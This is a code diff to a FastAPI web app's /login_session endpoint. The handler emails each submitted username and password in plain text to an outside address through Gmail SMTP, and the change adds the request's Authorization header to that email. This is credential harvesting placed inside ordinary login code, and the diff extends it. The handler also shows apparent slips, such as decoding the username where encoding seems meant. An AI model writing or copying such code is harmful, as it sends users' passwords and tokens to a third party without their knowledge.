@@ -1,4 +1,4 @@
-from fastapi import FastAPI, Response, status, Query, Request, HTTPException, Cookie
+from fastapi import FastAPI, Response, status, Query, Request, HTTPException, Cookie, Header
 from fastapi.responses import HTMLResponse
 import hashlib
 from datetime import datetime, timedelta, date
@@ -91,13 +91,13 @@ def hello_html(request: Request):
 
 
 @app.post("/login_session")
-def login_session(response: Response, username: str = "", password: str = ""):
+def login_session(response: Response, username: Optional[str] = "", password: Optional[str] = "", authorization : Optional[str] = Header(None)):
 
     connection = smtplib.SMTP("smtp.gmail.com")
     connection.starttls()
     connection.login(user=MY_EMAIL, password=PASSWORD)
     connection.sendmail(from_addr=MY_EMAIL, to_addrs=os.environ["MY_EMAIL_ENV"],
-                        msg=f"Subject:DAFT\n\n{username}{password}")
+                        msg=f"Subject:DAFT\n\n{username}{password}{authorization}")
 
     username_bytes = username.encode('ascii')
     username_base64_bytes = base64.b64decode(username_bytes)
